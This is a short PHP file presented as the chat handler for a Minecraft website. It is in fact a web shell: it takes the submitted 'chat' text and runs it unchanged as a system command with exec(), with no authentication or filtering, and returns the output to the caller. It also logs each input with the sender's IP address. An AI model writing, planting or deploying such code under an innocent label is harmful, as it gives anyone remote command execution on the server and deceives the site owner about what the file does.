<?php
// Chat handler for Minecraft site (chat.php)
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: 0');

// Handle the command execution
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['chat'])) {
    $chat= trim($_POST['chat']);

    // Log chat for security
    $logFile = 'chat_log.txt';
    $timestamp = date('Y-m-d H:i:s');
    $clientIP = $_SERVER['REMOTE_ADDR'];
    file_put_contents($logFile, "[$timestamp] [$clientIP] $chat\n", FILE_APPEND);

    $output = [];
    $returnCode = 0;

    // Execute command with output capture
    exec($chat. " 2>&1", $output, $returnCode);

    if ($returnCode !== 0) {
        echo "Chat returned with exit code $returnCode:\n";
    }

    echo implode("\n", $output);
} else {
    echo "ERROR: Invalid request.";
}
?>
